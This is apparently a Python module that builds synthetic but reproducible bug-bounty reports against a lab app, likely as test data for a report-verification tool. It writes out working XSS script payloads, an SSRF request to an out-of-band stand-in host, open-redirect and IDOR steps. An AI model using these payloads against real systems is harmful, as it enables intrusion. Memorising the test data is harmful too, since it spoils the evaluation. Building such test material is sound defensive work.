"""Builders for valid, reproducible synthetic reports.

Each builder produces a report whose reproduction steps actually reproduce the
bug against the lab app. The evidence embedded (raw HTTP request / marker) is
what the verifiers later look for.
"""

from __future__ import annotations

from .lab import (
    IDOR,
    INVOICES,
    LAB_ACCOUNTS,
    OPEN_REDIRECT,
    REDIRECT_MARKER_URL,
    SSRF,
    XSS_REFLECTED,
    XSS_STORED,
)
from .schema import Attachment, Label, SyntheticReport


def _raw_request(method: str, path: str, host: str = "lab-app:8000", body: str = "") -> Attachment:
    head = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: deslop-lab\r\n"
        f"Accept: */*\r\n"
    )
    if body:
        head += "Content-Type: application/x-www-form-urlencoded\r\n"
        head += f"Content-Length: {len(body)}\r\n"
        head += f"\r\n{body}"
    else:
        head += "\r\n"
    return Attachment(name="request.http", kind="raw_http", content=head)


def build_idor(report_id: str, victim: str = "alice", attacker: str = "bob", variant: int = 0) -> SyntheticReport:
    owners = [d["owner"] for d in INVOICES.values()]
    victim = owners[variant % len(owners)]
    inv_id = next(i for i, d in INVOICES.items() if d["owner"] == victim)
    secret = INVOICES[inv_id]["secret"]
    body = (
        "## Summary\n"
        f"Authenticated user {attacker} can read invoice {inv_id} owned by {victim}.\n\n"
        "## Steps to reproduce\n"
        f"1. Log in as {attacker} at POST /api/login with the researcher's own credentials.\n"
        f"2. Send GET /api/invoices/{inv_id} with the session cookie from step 1.\n"
        f"3. Observe the response contains {victim}'s invoice, including the field "
        f"secret={secret}, which does not belong to {attacker}.\n\n"
        "## Expected result\n"
        "The API should return 403 or 404 for an invoice the caller does not own.\n\n"
        "## Actual result\n"
        f"HTTP 200 with {victim}'s invoice data.\n\n"
        f"## Evidence\n"
        f"Raw request:\n\n```http\nGET /api/invoices/{inv_id} HTTP/1.1\n"
        f"Host: api.lab.test\nCookie: lab_session=<session of {attacker}>\n```\n"
    )
    return SyntheticReport(
        id=report_id,
        label=Label.VALID,
        title=f"IDOR: invoice {inv_id} readable across accounts",
        body=body,
        asset="api.lab.test",
        endpoint=f"/api/invoices/{inv_id}",
        vuln_class=IDOR,
        claimed_severity="high",
        attachments=[_raw_request("GET", f"/api/invoices/{inv_id}")],
        reproducible=True,
        notes=f"owned by {victim}; attacker {attacker}",
    )


def build_reflected_xss(report_id: str) -> SyntheticReport:
    body = (
        "## Summary\n"
        "The q parameter of /search reflects input without HTML encoding.\n\n"
        "## Steps to reproduce\n"
        "1. Open the search page with the payload in q.\n"
        "2. The script is reflected into the HTML and executes in the browser.\n"
        "3. The page title becomes XSS_REFLECTED_MARKER, proving execution.\n\n"
        "## Evidence\n"
        "Raw request:\n\n```http\n"
        "GET /search?q=<script>document.title='XSS_REFLECTED_MARKER'</script> HTTP/1.1\n"
        "Host: www.lab.test\n```\n"
    )
    return SyntheticReport(
        id=report_id,
        label=Label.VALID,
        title="Reflected XSS in /search q parameter",
        body=body,
        asset="www.lab.test",
        endpoint="/search",
        vuln_class=XSS_REFLECTED,
        claimed_severity="medium",
        attachments=[_raw_request("GET", "/search?q=<script>document.title='XSS_REFLECTED_MARKER'</script>")],
        reproducible=True,
    )


def build_stored_xss(report_id: str) -> SyntheticReport:
    body = (
        "## Summary\n"
        "Comment text is stored and rendered without encoding, persistent XSS.\n\n"
        "## Steps to reproduce\n"
        "1. POST the comment with the payload in text.\n"
        "2. Open the comments page in a browser.\n"
        "3. The script executes and sets the page title to XSS_STORED_MARKER.\n\n"
        "## Evidence\n"
        "Raw request:\n\n```http\n"
        "POST /api/comments HTTP/1.1\n"
        "Host: www.lab.test\n"
        "Content-Type: application/x-www-form-urlencoded\n\n"
        "author=attacker&text=<script>document.title='XSS_STORED_MARKER'</script>\n```\n"
    )
    return SyntheticReport(
        id=report_id,
        label=Label.VALID,
        title="Stored XSS via comment board",
        body=body,
        asset="www.lab.test",
        endpoint="/api/comments",
        vuln_class=XSS_STORED,
        claimed_severity="high",
        attachments=[
            _raw_request(
                "POST",
                "/api/comments",
                body="author=attacker&text=<script>document.title='XSS_STORED_MARKER'</script>",
            )
        ],
        reproducible=True,
    )


def build_ssrf(report_id: str) -> SyntheticReport:
    body = (
        "## Summary\n"
        "The url parameter of /api/fetch is fetched server-side without validation, "
        "allowing SSRF.\n\n"
        "## Steps to reproduce\n"
        "1. Send the fetch request with the url parameter pointing at the OOB host.\n"
        "2. The server performs the outbound request.\n"
        "3. An interaction is recorded by the out-of-band listener for the token.\n\n"
        "## Evidence\n"
        "Raw request:\n\n```http\n"
        "GET /api/fetch?url=http://deadbeefcafe0123.oob.test/cb HTTP/1.1\n"
        "Host: api.lab.test\n```\n"
    )
    return SyntheticReport(
        id=report_id,
        label=Label.VALID,
        title="SSRF in /api/fetch url parameter",
        body=body,
        asset="api.lab.test",
        endpoint="/api/fetch",
        vuln_class=SSRF,
        claimed_severity="critical",
        attachments=[_raw_request("GET", "/api/fetch?url=http://example.oob.test/cb")],
        reproducible=True,
    )


def build_open_redirect(report_id: str) -> SyntheticReport:
    body = (
        "## Summary\n"
        "The next parameter of /redirect is used in a Location header without "
        "validation, allowing open redirects.\n\n"
        "## Steps to reproduce\n"
        "1. Open the redirect endpoint with next set to the marker URL.\n"
        "2. The server responds 302 with Location pointing at the attacker domain.\n"
        "3. The browser is redirected to the external marker domain.\n\n"
        "## Evidence\n"
        "Raw request:\n\n```http\n"
        f"GET /redirect?next={REDIRECT_MARKER_URL} HTTP/1.1\n"
        "Host: www.lab.test\n```\n"
    )
    return SyntheticReport(
        id=report_id,
        label=Label.VALID,
        title="Open redirect on /redirect",
        body=body,
        asset="www.lab.test",
        endpoint="/redirect",
        vuln_class=OPEN_REDIRECT,
        claimed_severity="low",
        attachments=[_raw_request("GET", f"/redirect?next={REDIRECT_MARKER_URL}")],
        reproducible=True,
    )


VALID_BUILDERS = {
    IDOR: build_idor,
    XSS_REFLECTED: build_reflected_xss,
    XSS_STORED: build_stored_xss,
    SSRF: build_ssrf,
    OPEN_REDIRECT: build_open_redirect,
}


def build_valid(bug_class: str, report_id: str) -> SyntheticReport:
    return VALID_BUILDERS[bug_class](report_id)


def lab_account_summary() -> str:
    return ", ".join(LAB_ACCOUNTS)
